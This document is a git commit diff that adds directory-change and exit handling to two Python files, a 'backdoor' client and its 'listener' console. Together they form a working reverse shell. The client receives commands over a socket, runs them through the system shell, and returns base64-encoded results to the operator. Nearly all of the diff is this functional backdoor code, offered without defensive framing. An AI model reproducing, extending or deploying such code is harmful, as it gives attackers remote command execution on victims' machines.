48dcb3537504e580c0c98e87480511374e633a2e
marcelgaedke <marcelgaedke@yahoo.com>
2019-07-10 21:00:38 +0200

    added cd functionality

--- backdoor.py
+++ backdoor.py
@@ -1,5 +1,5 @@
-import socket, json
-import subprocess
+import socket, json, base64
+import subprocess, os
 
 
 class Backdoor:
@@ -9,28 +9,39 @@ class Backdoor:
 
     def reliable_send(self,data):
         jason_data = json.dumps(data)
-        self.connection.send(jason_data)
+        self.connection.send(base64.b64encode(jason_data))
 
     def reliable_receive(self):
         json_data = ""
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
-                return json.loads(json_data)
+                return json.loads(base64.b64decode(json_data))
             except ValueError:
                 continue
 
     def execute_system_command(self,command):
-        result = subprocess.check_output(command, shell=True)
+        result = subprocess.check_output(" ".join(command), shell=True)
         return result
+
+    def change_working_directory_to(self, path):
+        os.chdir(path)
 
     def run(self):
         while True:
             command = self.reliable_receive()
-            command_result = self.execute_system_command(command)
+            print("Command received: "+str(command))
+            if command[0] == "exit":
+                break
+            elif command[0] == "cd" and len(command) == 2:
+                self.change_working_directory_to(command[1])
+                command_result = "Changed directory to "+os.getcwd()
+            else:
+                command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
-
+        print("Exit")
         self.connection.close()
+        exit()
 
 
 my_backdoor =Backdoor("localhost",1234)
--- listener.py
+++ listener.py
@@ -1,4 +1,4 @@
-import socket, json
+import socket, json, base64
 
 
 class Listener:
@@ -15,14 +15,14 @@ class Listener:
 
     def reliable_send(self,data):
         jason_data = json.dumps(data)
-        self.connection.send(jason_data)
+        self.connection.send(base64.b64encode(jason_data))
 
     def reliable_receive(self):
         json_data=""
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
-                return json.loads(json_data)
+                return json.loads(base64.b64decode(json_data))
             except ValueError:
                 continue
 
@@ -30,11 +30,14 @@ class Listener:
 
     def execute_remotely(self,command):
         self.reliable_send(command)
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
         return self.reliable_receive()
 
     def run(self):
         while True:
-            user_input=raw_input(">> ")
+            user_input=raw_input(">> ").split(' ')
             result = self.execute_remotely(user_input)
             print(result)
 
